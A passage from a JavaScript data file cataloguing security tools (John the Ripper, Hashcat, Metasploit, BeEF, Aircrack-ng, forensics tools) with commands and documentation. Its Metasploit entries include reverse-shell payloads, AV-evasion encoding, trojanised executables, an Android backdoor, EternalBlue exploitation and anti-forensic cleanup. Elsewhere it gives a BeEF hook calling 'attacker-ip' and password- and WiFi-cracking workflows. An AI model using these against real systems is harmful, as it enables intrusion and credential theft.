i→1, o→0\\n• Position-based transformations\\n• Reject rules for performance\\n• Custom rules in john.conf\\n• Rule stacking for complex transformations\\n\\nJumbo Version Enhancements:\\n• 200+ additional hash formats\\n• GPU acceleration support (OpenCL, CUDA)\\n• Better wordlist handling\\n• Enhanced mask mode\\n• Competitive format crackers\\n• Regular security updates\\n• Community contributions\\n\\nFormat Detection:\\n• Automatic format detection (limited)\\n• Use --format=NAME for explicit specification\\n• List formats: john --list=formats\\n• List subformats: john --list=subformats\\n• Benchmark specific format: john --test --format=md5\\n\\nHelper Scripts (*2john utilities):\\n• zip2john: Extract ZIP password hashes\\n• rar2john: Extract RAR archive hashes\\n• pdf2john: Extract PDF password hashes\\n• office2john: Microsoft Office documents\\n• keepass2john: KeePass database files\\n• ssh2john: SSH private key passphrases\\n• truecrypt2john: TrueCrypt volumes\\n• bitcoin2john: Bitcoin wallet files\\n• ethereum2john: Ethereum keystores\\n• mozilla2john: Firefox master password\\n\\nPerformance Optimization:\\n• --fork=N: Parallelize across CPU cores\\n• OpenMP: Automatic multi-threading for some formats\\n• GPU acceleration: --format=sha512crypt-opencl\\n• Node distribution: Distribute across multiple machines\\n• Format-specific optimizations\\n• Memory management for large wordlists\\n\\nSession Management:\\n• Automatic session saving every 10 minutes\\n• --session=NAME: Named sessions\\n• --restore[=NAME]: Resume interrupted session\\n• --status[=NAME]: Check session progress\\n• Session files in ~/.john or current directory\\n\\nConfiguration (john.conf):\\n• Incremental mode character sets\\n• Word mangling rules\\n• External mode filters (C code)\\n• Hash algorithm preferences\\n• Cracking order optimization\\n• Format-specific parameters\\n• Markov mode settings\\n\\nExternal Mode:\\n• Custom filters written in C\\n• Compile into John at runtime\\n• Full control over candidate generation\\n• Can implement custom algorithms\\n• Examples: keyboard patterns, date generation\\n\\nPractical Workflows:\\n• Linux Audit:\\n  1. unshadow /etc/passwd /etc/shadow > combined\\n  2. john --single combined\\n  3. john --wordlist=rockyou.txt --rules combined\\n  4. john --incremental combined\\n• Windows Audit:\\n  1. Extract hashes with pwdump, fgdump, or mimikatz\\n  2. john --format=NT ntlm.txt\\n  3. john --format=LM lm.txt (if available)\\n• Application Passwords:\\n  1. Extract with appropriate *2john tool\\n  2. john --wordlist=passwords.txt hash.txt\\n  3. john --incremental=Alnum hash.txt\\n\\nBest Practices:\\n• Start with --single for quick wins\\n• Use rockyou.txt or similar common wordlists\\n• Apply rules for wordlist mutations\\n• Save output with --pot=custom.pot\\n• Use --show to view already cracked passwords\\n• Monitor progress with --status\\n• Run benchmark before production use\\n• Use --fork for multi-core CPUs\\n• Consider GPU version for massive jobs\\n• Keep john.pot backed up\\n\\nCommon Pitfalls:\\n• Wrong format specification (common with raw hashes)\\n• Not using rules with wordlists (misses obvious mutations)\\n• Running incremental mode first (extremely slow)\\n• Forgetting to check john.pot before restarting\\n• Not monitoring progress (--status)\\n• Using default john.conf (may need tuning)\\n• Expecting quick results with strong passwords\\n• Not utilizing multiple cores (--fork)\\n\\nIntegration:\\n• Hashcat: Complementary tool with GPU focus\\n• Hydra: Network service brute forcing\\n• Metasploit: Post-exploitation hash cracking\\n• Cain & Abel: Windows-focused alternative\\n• Ophcrack: Rainbow table attacks\\n• Custom scripts: Parse output for reporting\\n\\nReal-World Applications:\\n• Security Audits: Test organizational password strength\\n• Incident Response: Recover passwords from seized systems\\n• Forensics: Access encrypted evidence\\n• Compliance: Validate password policies (PCI DSS, NIST)\\n• Penetration Testing: Escalate privileges via weak passwords\\n• Red Team: Crack dumped hashes for lateral movement\\n• CTF: Recover passwords from challenge files\\n\\nLegal and Ethical Considerations:\\n• Only crack passwords you own or have authorization\\n• Document authorization before engagement\\n• Securely handle and dispose of password hashes\\n• Follow responsible disclosure for findings\\n• Comply with local laws regarding security testing",
        githubUrl: "https://github.com/openwall/john",
        tags: ["password cracking", "hash", "audit", "security testing"],
        additionalInfo: "John the Ripper was initially developed by Solar Designer and is now maintained by the Openwall Project. There are multiple versions available, including the core version and the community-enhanced 'jumbo' version with additional features."
      },
      {
        id: "hashcat",
        name: "Hashcat",
        description: "Advanced GPU-accelerated password recovery utility",
        category: "Password Attacks",
        categoryId: "password-attacks",
        installation: "sudo apt install hashcat",
        usage: "Hashcat is used for high-speed password cracking with GPU acceleration",
        examples: [
          {
            title: "Basic MD5 cracking with wordlist",
            code: "hashcat -m 0 -a 0 hashes.txt wordlist.txt"
          },
          {
            title: "Brute force attack (6 chars, all characters)",
            code: "hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a"
          },
          {
            title: "Rule-based attack with best64 rules",
            code: "hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule"
          },
          {
            title: "Crack Windows NTLM hashes",
            code: "hashcat -m 1000 -a 0 ntlm.txt rockyou.txt"
          },
          {
            title: "Crack bcrypt hashes",
            code: "hashcat -m 3200 -a 0 bcrypt.txt wordlist.txt"
          },
          {
            title: "Crack WPA/WPA2 handshakes",
            code: "hashcat -m 22000 -a 0 capture.hc22000 wordlist.txt"
          },
          {
            title: "Mask attack with known pattern (Password + 3 digits)",
            code: "hashcat -m 0 -a 3 hashes.txt Password?d?d?d"
          },
          {
            title: "Hybrid wordlist + mask attack",
            code: "hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d?d"
          },
          {
            title: "Combination attack (two wordlists)",
            code: "hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt"
          },
          {
            title: "Use multiple GPUs",
            code: "hashcat -m 0 -a 0 -d 1,2,3 hashes.txt wordlist.txt"
          },
          {
            title: "Show cracked passwords",
            code: "hashcat -m 0 hashes.txt --show"
          },
          {
            title: "Benchmark all hash types",
            code: "hashcat -b"
          },
          {
            title: "Session management (resume)",
            code: "hashcat -m 0 -a 0 hashes.txt wordlist.txt --session=mysession\\nhashcat --session=mysession --restore"
          },
          {
            title: "Increment mode (try 1-8 character passwords)",
            code: "hashcat -m 0 -a 3 hashes.txt --increment --increment-min=1 --increment-max=8 ?a?a?a?a?a?a?a?a"
          },
          {
            title: "Custom charset definition",
            code: "hashcat -m 0 -a 3 hashes.txt -1 ?l?u?d ?1?1?1?1?1?1?1?1"
          },
          {
            title: "Potfile output (save cracked hashes)",
            code: "hashcat -m 0 -a 0 hashes.txt wordlist.txt --potfile-path=custom.pot"
          },
          {
            title: "Crack with multiple rules",
            code: "hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule -r rules/toggles1.rule"
          },
          {
            title: "Hash cracking with status updates",
            code: "hashcat -m 0 -a 0 hashes.txt wordlist.txt --status --status-timer=10"
          }
        ],
        documentation: "Hashcat is the world's fastest password recovery tool, holding multiple world records for speed. Created by Jens 'atom' Steube, it's the first and only password cracker to support GPU acceleration with native OpenCL and CUDA support. It supports over 350 hash algorithms and five attack modes.\\n\\nSupported Hash Algorithms (350+):\\n• Raw Hashes: MD4, MD5, SHA1, SHA2-224/256/384/512, SHA3, BLAKE2\\n• Salted Hashes: MD5(salt.pass), sha1(salt.pass), custom salt positions\\n• Iterated Hashes: PBKDF2-HMAC-SHA1/SHA256/SHA512, bcrypt, scrypt\\n• Operating Systems: Unix crypt, macOS, Windows LM/NTLM/NTLMv2\\n• Network Protocols: NetNTLMv1/v2, Kerberos 5 TGS-REP, IKE-PSK, WPA/WPA2\\n• Applications: 7-Zip, RAR3/RAR5, ZIP, Office, PDF, Bitcoin, Ethereum\\n• Database Systems: MySQL, PostgreSQL, Oracle, MSSQL, MongoDB\\n• Web Applications: WordPress, Joomla, Drupal, phpBB3, Django\\n• VPN/Network: Cisco IOS, Juniper, IPsec, IKEv2, PPTP\\n\\nAttack Modes:\\n• Straight (-a 0): Dictionary attack with optional rules\\n  • Simple wordlist processing\\n  • Combine with rules for mutations\\n  • Most common and efficient mode\\n  • Example: hashcat -m 0 -a 0 hash.txt rockyou.txt\\n• Combination (-a 1): Combine words from two wordlists\\n  • Joins word1 + word2\\n  • Effective for compound passwords\\n  • Example: password + 123 = password123\\n  • Can generate massive candidates\\n• Brute-force (-a 3): Try all combinations (mask attack)\\n  • Position-specific character sets\\n  • Masks: ?l (lower), ?u (upper), ?d (digit), ?s (special), ?a (all)\\n  • Example: Password?d?d?d?d\\n  • Use --increment for variable length\\n• Hybrid Wordlist+Mask (-a 6): Wordlist followed by mask\\n  • Append brute-force to dictionary words\\n  • Example: password + ?d?d?d = password123\\n  • Efficient for known patterns\\n• Hybrid Mask+Wordlist (-a 7): Mask followed by wordlist\\n  • Prepend brute-force to dictionary words\\n  • Example: ?d?d?d + password = 123password\\n\\nGPU Acceleration:\\n• OpenCL: Cross-platform (AMD, NVIDIA, Intel)\\n• CUDA: NVIDIA-specific (often faster than OpenCL)\\n• Multi-GPU: Use -d flag to specify devices\\n• Workload Tuning: -w 1-4 (1=low, 4=nightmare)\\n• Performance: 100-1000x faster than CPU\\n• Power Usage: Monitor temps with --hwmon-temp-abort\\n• Memory: Hash tables loaded into GPU VRAM\\n\\nRule-Based Attacks:\\n• Built-in Rules: best64.rule, dive.rule, generated.rule, toggles*.rule\\n• Operations:\\n  • Append/Prepend: $1, $!, ^1, ^!\\n  • Replace: sa@ (replace a with @)\\n  • Case: u (uppercase), l (lowercase), c (capitalize)\\n  • Duplicate: d (double word)\\n  • Reverse: r\\n  • Delete: [ (first char), ] (last char)\\n• Custom Rules: Create in .rule files\\n• Multiple Rules: Stack with multiple -r flags\\n• Rule Generator: Generate rules based on patterns\\n\\nMask Attack Charsets:\\n• Built-in:\\n  • ?l = lowercase (abcdefghijklmnopqrstuvwxyz)\\n  • ?u = uppercase (ABCDEFGHIJKLMNOPQRSTUVWXYZ)\\n  • ?d = digits (0123456789)\\n  • ?s = special (!\\\"#$%&'()*+,-./:;<=>?@[\\\\]^_`{|}~)\\n  • ?a = all printable ASCII\\n  • ?b = all bytes (0x00-0xFF)\\n• Custom Charsets: -1, -2, -3, -4\\n  • Example: -1 ?l?u -2 ?d?s (charset 1 = letters, charset 2 = digits+special)\\n  • Use in mask: ?1?1?1?1?2?2\\n\\nIncrement Mode:\\n• Variable length attacks\\n• --increment: Enable increment mode\\n• --increment-min: Starting length\\n• --increment-max: Maximum length\\n• Example: Try 1-8 character passwords\\n• Significantly increases attack time\\n\\nSession Management:\\n• --session=NAME: Create named session\\n• --restore: Resume crashed/stopped session\\n• Auto-save every 10 seconds\\n• Checkpoint/restore functionality\\n• Potfile: Stores cracked hashes (.pot)\\n• Skip cracked hashes automatically\\n\\nPotfile Management:\\n• Default: hashcat.potfile\\n• Custom: --potfile-path=custom.pot\\n• Format: hash:password\\n• Automatic deduplication\\n• --show: Display cracked passwords\\n• --left: Show uncracked hashes\\n• --username: Include usernames in output\\n\\nPerformance Tuning:\\n• Workload Profiles (-w):\\n  • 1: Low (Desktop usable, slower)\\n  • 2: Default (Balanced)\\n  • 3: High (Desktop laggy)\\n  • 4: Nightmare (System unresponsive, fastest)\\n• Kernel Accel (-n): Workload size\\n• Kernel Loops (-u): Iteration count\\n• --force: Bypass warnings (use cautiously)\\n• --backend-devices: Select specific GPUs\\n\\nHash Mode Selection (-m):\\n• 0: MD5\\n• 100: SHA1\\n• 1000: NTLM\\n• 1400: SHA2-256\\n• 1700: SHA2-512\\n• 1800: Unix crypt SHA-512\\n• 3200: bcrypt\\n• 22000: WPA-PBKDF2-PMKID+EAPOL\\n• Full list: hashcat --help | grep -i 'mode'\\n\\nBenchmarking:\\n• --benchmark (-b): Test all algorithms\\n• --benchmark-all: Include slow algorithms\\n• Shows hashes/second per algorithm\\n• Use to select optimal workload\\n• Compare CPU vs GPU performance\\n\\nOutput Options:\\n• --outfile: Save cracked passwords to file\\n• --outfile-format: Custom output format\\n  • 1: hash\\n  • 2: plain\\n  • 3: hash:plain\\n  • 5: hash:plain:hex_plain\\n• --status: Display status screen\\n• --status-timer: Update interval (seconds)\\n• --quiet: Suppress output\\n• --remove: Remove cracked hashes from input\\n\\nBest Practices:\\n• Start with straight attack + rules (fastest)\\n• Use increment mode cautiously (exponential time)\\n• Monitor GPU temperature (--hwmon-temp-abort=90)\\n• Use workload profile 3 or 4 for dedicated machines\\n• Keep potfile backed up\\n• Use sessions for long-running attacks\\n• Benchmark before production use\\n• Update regularly for new hash support\\n• Use multiple GPUs for massive jobs\\n• Combine masks with knowledge (known patterns)\\n\\nCommon Pitfalls:\\n• Wrong hash mode (-m) selection\\n• Not using rules with dictionaries\\n• Increment mode on large keyspace (years to complete)\\n• Overheating GPUs without monitoring\\n• Forgetting to check potfile before restarting\\n• Using workload 4 on desktop workstation\\n• Not using session for long attacks\\n• Inefficient mask patterns\\n• Ignoring benchmark results\\n\\nIntegration:\\n• John the Ripper: Complementary CPU-focused tool\\n• Hashcat-utils: Preprocessing utilities\\n• PACK: Password analysis and cracking kit\\n• Mentalist: GUI for wordlist generation\\n• Crunch: Custom wordlist generator\\n• CeWL: Website word scraper\\n• Cain & Abel: Windows hash extraction\\n\\nReal-World Applications:\\n• Penetration Testing: Crack captured hashes\\n• Security Audits: Test password strength\\n• Forensics: Recover passwords from seized systems\\n• Red Team: Post-exploitation credential access\\n• WiFi Security: WPA/WPA2 handshake cracking\\n• Cloud Security: Test credential policies\\n• Compliance: Validate password complexity (PCI DSS, NIST)\\n• Incident Response: Analyze compromised credentials\\n\\nAdvanced Techniques:\\n• Rule Stacking: Multiple rule files for complex mutations\\n• Hybrid Attacks: Combine wordlist with masks\\n• Prince Attack: Password candidate generator\\n• Combinator Attack: Combine multiple wordlists\\n• Toggle Case: Try all case combinations\\n• Custom Charsets: Language-specific characters\\n• Markov Chains: Probability-based generation\\n• PACK Statsprocessor: Statistics-based masks\\n\\nLegal and Ethical Considerations:\\n• Only crack hashes you own or have authorization\\n• Document authorization before engagement\\n• Comply with local laws regarding security testing\\n• Follow responsible disclosure for findings\\n• Securely dispose of captured hashes after testing",
        githubUrl: "https://github.com/hashcat/hashcat",
        tags: ["password", "hash", "cracking", "GPU", "acceleration"]
      }
    ]
  },
  {
    id: "exploitation-tools",
    name: "Exploitation Tools",
    description: "Tools for exploiting vulnerabilities and gaining access to systems",
    tools: [
      {
        id: "metasploit",
        name: "Metasploit Framework",
        description: "Advanced open-source platform for developing, testing, and executing exploits",
        category: "Exploitation Tools",
        categoryId: "exploitation-tools",
        installation: "sudo apt install metasploit-framework",
        usage: "Metasploit is used for penetration testing, exploit development, and vulnerability research. It provides a comprehensive platform for finding, exploiting, and validating vulnerabilities.",
        examples: [
          {
            title: "Start Metasploit console",
            code: "msfconsole"
          },
          {
            title: "Initialize database for workspace management",
            code: "msfdb init\ndb_status\nworkspace -a project_name"
          },
          {
            title: "Search for exploits by service/platform",
            code: "search type:exploit platform:windows apache\nsearch cve:2021 type:exploit\nsearch eternalblue"
          },
          {
            title: "Use multi handler for reverse shell",
            code: "use exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.100\nset LPORT 4444\nset ExitOnSession false\nexploit -j"
          },
          {
            title: "Generate Windows executable payload",
            code: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe"
          },
          {
            title: "Generate encoded payload to bypass AV",
            code: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded_payload.exe"
          },
          {
            title: "Generate PHP web shell",
            code: "msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php"
          },
          {
            title: "Generate Android APK backdoor",
            code: "msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o backdoor.apk"
          },
          {
            title: "Generate Linux ELF binary",
            code: "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o payload.elf"
          },
          {
            title: "Generate macOS Mach-O payload",
            code: "msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f macho -o payload.macho"
          },
          {
            title: "Inject payload into legitimate executable",
            code: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -x putty.exe -k -f exe -o trojan.exe"
          },
          {
            title: "Scan for SMB vulnerabilities (EternalBlue)",
            code: "use auxiliary/scanner/smb/smb_ms17_010\nset RHOSTS 192.168.1.0/24\nrun"
          },
          {
            title: "Exploit EternalBlue (MS17-010)",
            code: "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.50\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 192.168.1.100\nexploit"
          },
          {
            title: "Port scanning with Nmap integration",
            code: "db_nmap -sV -O 192.168.1.0/24\nhosts\nservices"
          },
          {
            title: "Import Nmap XML results",
            code: "db_import /path/to/nmap_results.xml\nhosts -c address,os_name\nservices -p 80,443"
          },
          {
            title: "Use auxiliary scanner modules",
            code: "use auxiliary/scanner/http/http_version\nset RHOSTS 192.168.1.0/24\nset THREADS 20\nrun"
          },
          {
            title: "Post-exploitation: Dump password hashes",
            code: "use post/windows/gather/hashdump\nset SESSION 1\nrun"
          },
          {
            title: "Post-exploitation: Keylogger",
            code: "use post/windows/capture/keylog_recorder\nset SESSION 1\nrun"
          },
          {
            title: "Meterpreter: System information",
            code: "# From meterpreter session\nsysinfo\ngetuid\npwd\nls"
          },
          {
            title: "Meterpreter: Privilege escalation",
            code: "# From meterpreter session\ngetsystem\ngetprivs"
          },
          {
            title: "Meterpreter: Process migration",
            code: "# From meterpreter session\nps\nmigrate 1234"
          },
          {
            title: "Meterpreter: Screenshot and webcam",
            code: "# From meterpreter session\nscreenshot\nwebcam_snap"
          },
          {
            title: "Pivoting through compromised host",
            code: "# From meterpreter session\nrun autoroute -s 10.10.10.0/24\nbackground\nuse auxiliary/scanner/portscan/tcp\nset RHOSTS 10.10.10.0/24"
          },
          {
            title: "Resource scripts for automation",
            code: "msfconsole -r script.rc"
          }
        ],
        documentation: "The Metasploit Framework is the world's most widely used penetration testing framework. Originally created by H.D. Moore in 2003 and now maintained by Rapid7, it provides a comprehensive infrastructure for exploit development, testing, and execution. With over 2,300 exploits, 1,200 payloads, and 600 auxiliary modules, Metasploit is the industry standard for security professionals, ethical hackers, and red teams.\\n\\nCore Architecture:\\n• Exploits: Code that takes advantage of specific vulnerabilities\\n• Payloads: Code that runs after successful exploitation (shells, Meterpreter, etc.)\\n• Auxiliary: Supporting modules (scanners, fuzzers, DoS, etc.)\\n• Post-Exploitation: Modules for actions after gaining access\\n• Encoders: Obfuscate payloads to evade detection\\n• NOPs: No-operation code generators for buffer alignment\\n• Evasion: Modules designed specifically to bypass security controls\\n\\nMSFconsole - Command Center:\\n• Interactive Ruby shell (IRB) with custom commands\\n• Database integration (PostgreSQL) for workspace management\\n• Tab completion for all commands and module options\\n• Context-aware help system (help, info, show options)\\n• Resource scripts (.rc) for automation\\n• Session management for multiple compromised hosts\\n• Workspaces for organizing different engagements\\n\\nMSFvenom - Payload Generator:\\n• Unified tool replacing msfpayload and msfencode\\n• 60+ output formats (exe, elf, raw, python, powershell, etc.)\\n• 20+ encoding schemes for AV evasion\\n• Template injection into legitimate binaries (-x, -k flags)\\n• Architecture-specific payloads (x86, x64, ARM, MIPS)\\n• Platform support: Windows, Linux, macOS, Android, iOS\\n• Staged vs Stageless payloads (size vs reliability tradeoff)\\n\\nPayload Types:\\n• Singles: Self-contained, sent in one shot (e.g., shell_reverse_tcp)\\n• Stagers: Small payload that downloads larger stage (e.g., reverse_tcp)\\n• Stages: Downloaded by stager for full functionality (e.g., meterpreter)\\n• Inline: Full payload sent at once (stageless)\\n• Advantages:\\n  • Staged: Smaller initial payload, evades size-based detection\\n  • Stageless: More reliable, works in restricted networks\\n\\nMeterpreter - Advanced Payload:\\n• Reflected DLL injection (runs in memory, no disk writes)\\n• Encrypted communication channel (TLS 1.2)\\n• Extensible via scripts and modules\\n• File system operations (upload, download, edit)\\n• Process manipulation (list, kill, migrate)\\n• Network pivoting and port forwarding\\n• Privilege escalation modules\\n• Credential dumping (hashdump, mimikatz)\\n• Screenshot, keylogging, webcam capture\\n• Packet sniffing and network reconnaissance\\n• Registry manipulation (Windows)\\n• Android extensions (SMS, call logs, GPS)\\n\\nDatabase Integration:\\n• PostgreSQL backend for data persistence\\n• Workspace separation for multiple projects\\n• Import results from Nmap, Nessus, Nexpose\\n• Track hosts, services, vulnerabilities, credentials\\n• Query results with hosts, services, vulns commands\\n• Export to XML, JSON for reporting\\n• Credential management with creds command\\n\\nAuxiliary Modules:\\n• Scanners: Port, service, vulnerability detection\\n  • scanner/portscan/tcp, scanner/smb/smb_version\\n  • scanner/http/dir_scanner, scanner/ssh/ssh_login\\n• Fuzzers: Find vulnerabilities via malformed input\\n• DoS: Denial of service testing\\n• SNMP: Enumerate SNMP information\\n• VoIP: SIP, H.323 protocol testing\\n• Wireless: 802.11 attacks and analysis\\n• Password Spraying: Test common passwords across accounts\\n\\nPost-Exploitation Modules:\\n• Windows:\\n  • gather/hashdump: Extract password hashes\\n  • gather/enum_chrome: Steal Chrome credentials\\n  • manage/enable_rdp: Enable Remote Desktop\\n  • escalate/getsystem: Privilege escalation\\n• Linux:\\n  • gather/enum_configs: Enumerate configurations\\n  • gather/hashdump: Extract /etc/shadow\\n• Multi-platform:\\n  • multi/gather/ssh_creds: Steal SSH keys\\n  • multi/manage/shell_to_meterpreter: Upgrade shell\\n\\nEvasion Techniques:\\n• Encoders: shikata_ga_nai (polymorphic), call4_dword_xor\\n• Multiple encoding iterations (-i flag)\\n• Custom templates to embed in trusted executables\\n• Process migration to trusted processes\\n• In-memory execution (Meterpreter, PowerShell payloads)\\n• Transport switching (HTTP, HTTPS, DNS)\\n• Sleep obfuscation and jitter\\n• Anti-forensics (timestomp, clearev)\\n\\nPivoting and Lateral Movement:\\n• autoroute: Route traffic through compromised host\\n• portfwd: Forward ports through session\\n• socks_proxy: Create SOCKS proxy via session\\n• Proxychains integration for tool routing\\n• Multi-hop pivoting through multiple compromised hosts\\n• Cross-subnet exploitation\\n\\nAutomation and Scripting:\\n• Resource Scripts (.rc): Batch commands\\n• Meterpreter Scripts: Ruby scripts for custom actions\\n• Post modules: Reusable Ruby modules\\n• RPC API: Remote control via MSGPACK\\n• REST API: Web-based integration\\n• Custom modules: Ruby classes in modules directory\\n\\nIntegration Capabilities:\\n• Cobalt Strike: Beacon integration\\n• Empire/Covenant: C2 framework interop\\n• Burp Suite: Web app testing integration\\n• Armitage: GUI for team collaboration\\n• Metasploit Pro: Commercial features (reporting, campaigns)\\n• SIEM Integration: Export events to Splunk, etc.\\n\\nBest Practices:\\n• Always use workspaces for project separation\\n• Set global options with setg for efficiency\\n• Use database to track all reconnaissance data\\n• Test exploits in lab before production use\\n• Understand reliability and side effects (info command)\\n• Check target compatibility (platform, architecture)\\n• Use AutoRunScript for automatic post-exploitation\\n• Migrate Meterpreter to stable process immediately\\n• Use HTTPS transport for encrypted C2\\n• Clean up artifacts with clearev, timestomp\\n• Document all actions for reporting\\n• Keep framework updated (msfupdate)\\n\\nCommon Workflows:\\n• Reconnaissance: db_nmap, auxiliary scanners\\n• Vulnerability Identification: search, vulns command\\n• Exploitation: use exploit, set options, check, exploit\\n• Post-Exploitation: migrate, hashdump, gather modules\\n• Pivoting: autoroute, portfwd, additional exploitation\\n• Persistence: persistence modules, scheduled tasks\\n• Cleanup: clearev, remove backdoors, timestamps\\n• Reporting: Export database, generate reports\\n\\nReal-World Applications:\\n• Penetration Testing: Authorized security assessments\\n• Red Team Operations: Simulate APT attack campaigns\\n• Vulnerability Research: Test and develop exploits\\n• Security Training: Hands-on exploitation practice\\n• Compliance: Validate security controls (PCI DSS)\\n• Incident Response: Recreate attacker techniques\\n• Bug Bounty: Validate and prove exploitability\\n• CTF Competitions: Challenge solving and scoring\\n\\nCommon Pitfalls:\\n• Crashing target systems with unreliable exploits\\n• Getting caught by IDS/IPS with default payloads\\n• Losing sessions due to unstable payloads\\n• Not migrating Meterpreter causing session loss\\n• Forgetting to background sessions\\n• Using wrong payload architecture (x86 vs x64)\\n• Not checking target requirements before exploitation\\n• Triggering EDR with well-known payloads\\n• Leaving artifacts and forensic evidence",
        githubUrl: "https://github.com/rapid7/metasploit-framework",
        tags: ["exploitation", "penetration testing", "framework", "vulnerability", "payload"],
        additionalInfo: "Metasploit was originally created by H. D. Moore in 2003 and is now owned by Rapid7. It's available in both commercial (Metasploit Pro) and free (Metasploit Framework) versions. The framework is built into most penetration testing distributions and is considered a standard tool for security professionals."
      },
      {
        id: "beef",
        name: "BeEF (Browser Exploitation Framework)",
        description: "Tool focusing on leveraging browser vulnerabilities to assess the security posture of a target",
        category: "Exploitation Tools",
        categoryId: "exploitation-tools",
        installation: "sudo apt install beef-xss",
        usage: "BeEF is used to assess a target's security by focusing on the web browser attack vector",
        examples: [
          {
            title: "Start BeEF",
            code: "sudo beef-xss"
          },
          {
            title: "Hook browser with JavaScript",
            code: "<script src=\"http://attacker-ip:3000/hook.js\"></script>"
          },
          {
            title: "Access control panel",
            code: "http://127.0.0.1:3000/ui/panel"
          }
        ],
        documentation: "BeEF (Browser Exploitation Framework) is a penetration testing tool focusing on web browsers. It allows the penetration tester to assess the actual security posture of a target environment by using client-side attack vectors.",
        githubUrl: "https://github.com/beefproject/beef",
        tags: ["browser", "exploitation", "XSS", "client-side", "hook"]
      }
    ]
  },
  {
    id: "wireless-attacks",
    name: "Wireless Attacks",
    description: "Tools for analyzing and attacking wireless networks and protocols",
    tools: [
      {
        id: "aircrack-ng",
        name: "Aircrack-ng",
        description: "Complete suite of tools to assess WiFi network security",
        category: "Wireless Attacks",
        categoryId: "wireless-attacks",
        installation: "sudo apt install aircrack-ng",
        usage: "Aircrack-ng is used to monitor, attack, test, and crack WiFi networks. It includes tools for packet capture, WEP/WPA key cracking, and analysis.",
        examples: [
          {
            title: "Enable monitor mode",
            code: "airmon-ng start wlan0"
          },
          {
            title: "Capture packets",
            code: "airodump-ng wlan0mon"
          },
          {
            title: "Targeted capture",
            code: "airodump-ng -c 1 --bssid 00:11:22:33:44:55 -w capture wlan0mon"
          },
          {
            title: "Deauthentication attack",
            code: "aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon"
          },
          {
            title: "Crack WPA handshake",
            code: "aircrack-ng -w wordlist.txt capture-01.cap"
          }
        ],
        documentation: "Aircrack-ng is a network software suite consisting of a detector, packet sniffer, WEP and WPA/WPA2-PSK cracker and analysis tool for 802.11 wireless LANs. It works with any wireless network interface controller whose driver supports raw monitoring mode and can sniff 802.11a, 802.11b and 802.11g traffic.",
        githubUrl: "https://github.com/aircrack-ng/aircrack-ng",
        tags: ["wireless", "WiFi", "WEP", "WPA", "cracking", "monitoring"]
      },
      {
        id: "wifite",
        name: "Wifite",
        description: "Automated wireless attack tool designed to simplify wireless penetration testing",
        category: "Wireless Attacks",
        categoryId: "wireless-attacks",
        installation: "sudo apt install wifite",
        usage: "Wifite is used to automate wireless network attacks, making it easier to audit networks",
        examples: [
          {
            title: "Basic scan and attack",
            code: "sudo wifite"
          },
          {
            title: "Target specific encryption",
            code: "sudo wifite --wpa"
          },
          {
            title: "Specify a wordlist",
            code: "sudo wifite --dict /path/to/wordlist.txt"
          }
        ],
        documentation: "Wifite is designed to attack multiple WEP, WPA, and WPS encrypted networks in a row, making it a great tool for penetration testers who want to test the security of several networks quickly. It automates the wireless attack process and can be more user-friendly for beginners than using the aircrack-ng suite directly.",
        githubUrl: "https://github.com/derv82/wifite2",
        tags: ["wireless", "automation", "WPA", "WEP", "WPS"]
      }
    ]
  },
  {
    id: "forensics-tools",
    name: "Forensics Tools",
    description: "Tools for digital forensics and evidence collection",
    tools: [
      {
        id: "autopsy",
        name: "Autopsy",
        description: "Digital forensics platform for analyzing disk images and recovering files",
        category: "Forensics Tools",
        categoryId: "forensics-tools",
        installation: "sudo apt install autopsy",
        usage: "Autopsy is used for digital forensics investigations to recover and analyze evidence from disk images",
        examples: [
          {
            title: "Start Autopsy",
            code: "sudo autopsy"
          },
          {
            title: "Access web interface",
            code: "Open browser and navigate to http://localhost:9999/autopsy"
          }
        ],
        documentation: "Autopsy is a digital forensics platform that provides a graphical interface to The Sleuth Kit and other digital forensics tools. It can be used by law enforcement, military, and corporate examiners to investigate what happened on a computer. It features timeline analysis, hash filtering, file system analysis, keyword searching, and more.",
        githubUrl: "https://github.com/sleuthkit/autopsy",
        tags: ["forensics", "disk image", "analysis", "evidence", "recovery"]
      },
      {
        id: "volatility",
        name: "Volatility",
        description: "Memory forensics framework for incident response and malware analysis",
        category: "Forensics Tools",
        categoryId: "forensics-tools",
        installation: "sudo apt install volatility",
        usage: "Volatility is used to extract digital artifacts from volatile memory (RAM) samples",
        examples: [
          {
            title: "Identify memory profile",
            code: "volatility -f memory.dmp imageinfo"
          },
          {
            title: "List running processes",
            code: "volatility -f memory.dmp --profile=Win10x64_19041 pslist"
          },
          {
            title: "Show network connections",
            code: "volatility -f memory.dmp --profile=Win10x64_19041 netscan"
          }
        ],
        documentation: "Volatility is an advanced memory forensics framework that helps extract digital artifacts from volatile memory (RAM) samples. It is used for incident response, malware analysis, and general forensics investigations. The framework is written in Python and supports analysis of Windows, Linux, and macOS memory dumps.",
        githubUrl: "https://github.com/volatilityfoundation/volatility",
        tags: ["memory forensics", "RAM", "malware analysis", "incident response"]
      }
    ]
  },
  {
    id: "reverse-engineering",
    name: "Reverse Engineering",
    description: "Tools for analyzing compiled software and understanding its structure",
    tools: [
      {
        id: "ghidra",
        name: "Ghidra",
        description: "Software reverse engineering framework developed by NSA",
        category: "Reverse Engineering",
        categoryId: "reverse-engineering",
        installation: "Download from ghidra-sre.org",
